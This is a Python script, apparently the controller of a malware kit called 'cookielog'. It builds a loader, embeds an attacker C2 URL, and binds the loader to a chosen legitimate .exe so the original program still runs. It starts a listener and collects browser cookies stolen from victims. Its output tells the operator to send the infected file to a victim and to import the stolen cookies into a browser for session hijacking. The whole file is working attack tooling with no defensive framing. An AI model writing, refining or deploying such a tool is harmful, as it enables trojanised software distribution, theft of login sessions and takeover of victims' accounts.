#!/usr/bin/env python3
"""auto.py — one-click payload setup. Builds, starts listener, infects .exe.

Usage:
    python auto.py              # GUI mode (file picker dialog)
    python auto.py game.exe     # CLI mode (pass .exe as argument)
    python auto.py --port 9090  # custom C2 port (default: 9090)

What it does:
    1. Checks if loader.exe + ckdll.dll exist; if not, runs build.bat
    2. Detects attacker's local IP for C2 URL
    3. Starts listen.py in background (HTTP listener)
    4. Asks for the .exe to infect (GUI dialog or CLI arg)
    5. Infects it with the embedded C2 URL -> ifec/<name>.exe
    6. Waits for cookies to arrive in loot/
    7. Prints summary (cookie count, top domains)

Press Ctrl+C to stop the listener and exit.
"""
import json, os, socket, subprocess, sys, time, threading, struct

HERE   = os.path.dirname(os.path.abspath(__file__))
BIN    = os.path.join(HERE, "bin")
LOADER = os.path.join(BIN, "loader.exe")
DLL    = os.path.join(BIN, "ckdll.dll")
LOOT   = os.path.join(HERE, "loot")
IFEC   = os.path.join(HERE, "ifec")
LISTEN = os.path.join(HERE, "listen.py")
BUILD  = os.path.join(HERE, "build.bat")
MAGIC  = b"CKLG"
C2_SENTINEL = b"CKC2_DEADBEEF_"

def log(msg):
    print(msg, flush=True)

def detect_ip():
    """Detect attacker's local IP (not 127.0.0.1)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip.startswith("0.") or ip.startswith("169.254."):
            return "127.0.0.1"
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "127.0.0.1"

def ensure_build():
    """Build loader.exe + ckdll.dll if they don't exist."""
    if os.path.isfile(LOADER) and os.path.isfile(DLL):
        log("[+] binaries already compiled")
        return True
    if not os.path.isfile(BUILD):
        log("[-] build.bat not found")
        return False
    log("[*] building binaries (needs MSVC)...")
    r = subprocess.run(["cmd", "/c", BUILD], cwd=HERE,
                       capture_output=True, text=True, timeout=60)
    if r.stdout:
        for line in r.stdout.strip().splitlines():
            log("    " + line)
    if r.stderr:
        for line in r.stderr.strip().splitlines():
            log("    [!] " + line)
    if r.returncode != 0:
        log("[-] build failed (exit %d)" % r.returncode)
        return False
    if os.path.isfile(LOADER) and os.path.isfile(DLL):
        log("[+] build OK")
        return True
    log("[-] build succeeded but binaries not found")
    return False

def build_infected(host_path, c2_url):
    """Infect a .exe: [loader][host][host_len:4 LE][CKLG:4] with C2 URL patched in."""
    with open(LOADER, "rb") as f:
        loader_bytes = f.read()
    with open(host_path, "rb") as f:
        host_bytes = f.read()
    # strip appended data from loader if present (reuse)
    idx = loader_bytes.rfind(MAGIC)
    if idx != -1 and idx > len(loader_bytes) - 12:
        old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
        loader_bytes = loader_bytes[:idx - 4 - old_len]
    # if host was already infected, extract original
    hidx = host_bytes.rfind(MAGIC)
    if hidx != -1 and hidx > len(host_bytes) - 12:
        old_hlen = struct.unpack_from("<I", host_bytes, hidx - 4)[0]
        if old_hlen > 0 and hidx - 4 - old_hlen > 0:
            host_bytes = host_bytes[hidx - 4 - old_hlen : hidx - 4]
    # patch C2 URL
    if c2_url:
        sidx = loader_bytes.find(C2_SENTINEL)
        if sidx != -1:
            url_bytes = c2_url.encode("utf-8")[:255]
            url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
            loader_bytes = loader_bytes[:sidx] + url_padded + loader_bytes[sidx+256:]
    out = loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC
    os.makedirs(IFEC, exist_ok=True)
    bname = os.path.basename(host_path)
    out_path = os.path.join(IFEC, bname)
    with open(out_path, "wb") as f:
        f.write(out)
    return out_path

def start_listener(port):
    """Start listen.py in background. Returns the process handle."""
    os.makedirs(LOOT, exist_ok=True)
    # clean old loot
    for f in ["cookies.json", "cookies.txt"]:
        p = os.path.join(LOOT, f)
        if os.path.exists(p):
            os.remove(p)
    proc = subprocess.Popen(
        [sys.executable, "-u", LISTEN, str(port)],
        cwd=HERE,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        creationflags=0x00000010  # CREATE_NEW_CONSOLE
    )
    time.sleep(2)
    if proc.poll() is not None:
        log("[-] listener failed to start")
        return None
    log("[+] listener on port %d (PID=%d)" % (port, proc.pid))
    return proc

def wait_for_cookies(timeout=120):
    """Wait for cookies.json to appear in loot/. Print summary when done."""
    json_path = os.path.join(LOOT, "cookies.json")
    log("[*] waiting for cookies (timeout=%ds, Ctrl+C to stop)..." % timeout)
    start = time.time()
    while time.time() - start < timeout:
        if os.path.isfile(json_path) and os.path.getsize(json_path) > 10:
            try:
                with open(json_path, encoding="utf-8") as f:
                    data = json.load(f)
                if data:
                    log("\n[+] %d cookies received!" % len(data))
                    log("    -> %s (%d bytes)" % (json_path, os.path.getsize(json_path)))
                    txt_path = os.path.join(LOOT, "cookies.txt")
                    if os.path.isfile(txt_path):
                        log("    -> %s (%d bytes)" % (txt_path, os.path.getsize(txt_path)))
                    # top domains
                    top = {}
                    for c in data:
                        d = c.get("domain", "?")
                        top[d] = top.get(d, 0) + 1
                    log("\n    top domains:")
                    for d, n in sorted(top.items(), key=lambda kv: -kv[1])[:15]:
                        log("      %5d  %s" % (n, d))
                    log("\n[*] import in browser: Cookie-Editor extension -> Import -> paste loot/cookies.json")
                    return True
            except (json.JSONDecodeError, IOError):
                pass
        time.sleep(1)
    log("[-] timeout — no cookies received in %ds" % timeout)
    log("    check: is the listener running? is the C2 URL correct?")
    log("    fallback: C:\\ProgramData\\cookielog\\drop.json")
    return False

def pick_file_gui():
    """Open a file picker dialog. Returns the selected path or None."""
    try:
        import tkinter as tk
        from tkinter import filedialog, ttk
        root = tk.Tk()
        root.title("cookielog — select .exe to infect")
        root.geometry("480x200")
        root.configure(bg="#1a1a1a")
        style = ttk.Style()
        style.theme_use("clam")
        style.configure(".", background="#1a1a1a", foreground="#d4d4d4",
                        font=("Segoe UI", 10))
        style.configure("TLabel", background="#1a1a1a", foreground="#d4d4d4")
        style.configure("TButton", background="#2d2d2d", foreground="#d4d4d4",
                        font=("Segoe UI", 10, "bold"), padding=(12, 8))
        result = {"path": None}

        ttk.Label(root, text="cookielog — auto infector",
                  font=("Segoe UI", 14, "bold"),
                  foreground="#4a9eff").pack(pady=(20, 5))
        ttk.Label(root, text="click the button below to choose a .exe to infect",
                  font=("Segoe UI", 9)).pack(pady=(0, 15))

        def do_pick():
            f = filedialog.askopenfilename(
                title="Select .exe to infect",
                filetypes=[("executables", "*.exe"), ("all files", "*.*")])
            if f:
                result["path"] = f
                root.destroy()

        ttk.Button(root, text="SELECT .EXE", command=do_pick).pack(pady=5)
        ttk.Button(root, text="Cancel", command=root.destroy).pack(pady=2)
        root.mainloop()
        return result["path"]
    except Exception as ex:
        log("[!] GUI not available (%s)" % ex)
        return None

def main():
    port = 9090
    host_arg = None

    # parse args
    args = sys.argv[1:]
    i = 0
    port = 9090
    host_arg = None
    while i < len(args):
        a = args[i]
        if a == "--port" and i + 1 < len(args):
            port = int(args[i + 1]); i += 2
        elif a == "--cli":
            i += 1
        elif not a.startswith("--"):
            # join remaining non-flag args as the host path (handles spaces)
            parts = []
            while i < len(args) and not args[i].startswith("--"):
                parts.append(args[i]); i += 1
            host_arg = " ".join(parts)
        else:
            i += 1

    log("=" * 60)
    log("  cookielog — automatic payload setup")
    log("=" * 60)

    # 1. ensure binaries
    log("\n[1/5] checking binaries...")
    if not ensure_build():
        log("[-] cannot continue without binaries")
        return 1

    # 2. detect IP + build C2 URL
    log("\n[2/5] detecting attacker IP...")
    ip = detect_ip()
    c2_url = "http://%s:%d/" % (ip, port)
    log("[+] C2 URL: %s" % c2_url)
    if ip == "127.0.0.1":
        log("[!] could not detect local IP — using 127.0.0.1 (localhost only)")

    # 3. get .exe to infect
    log("\n[3/5] selecting .exe...")
    if host_arg:
        host_path = host_arg
        log("[+] host (from arg): %s" % host_path)
    else:
        host_path = pick_file_gui()
        if not host_path:
            log("[-] no .exe selected")
            return 1
        log("[+] host (from GUI): %s" % host_path)

    if not os.path.isfile(host_path):
        log("[-] file does not exist: %s" % host_path)
        return 1

    # 4. start listener
    log("\n[4/5] starting listener...")
    listener = start_listener(port)
    if not listener:
        log("[-] could not start listener")
        return 1

    # 5. infect
    log("\n[5/5] infecting...")
    try:
        out_path = build_infected(host_path, c2_url)
    except Exception as ex:
        log("[-] infection failed: %s" % ex)
        listener.terminate()
        return 1

    bname = os.path.basename(out_path)
    log("[+] infected: ifec\\%s" % bname)
    log("    loader: %d KB + host: %d KB = %d KB" % (
        os.path.getsize(LOADER) // 1024,
        os.path.getsize(host_path) // 1024,
        os.path.getsize(out_path) // 1024))
    log("[+] C2 URL embedded: %s" % c2_url)

    log("\n" + "=" * 60)
    log("  READY — send ifec\\%s to the victim" % bname)
    log("  when the victim runs it:")
    log("    - the original app/game opens normally")
    log("    - payload extracts cookies from the VICTIM's machine")
    log("    - cookies are sent via HTTP POST to %s" % c2_url)
    log("  cookies will appear in loot\\cookies.json")
    log("=" * 60)

    # 6. wait for cookies
    try:
        wait_for_cookies(timeout=300)
    except KeyboardInterrupt:
        log("\n[*] interrupted by user")
    finally:
        if listener.poll() is None:
            listener.terminate()
            log("[*] listener stopped")

    return 0

if __name__ == "__main__":
    sys.exit(main())
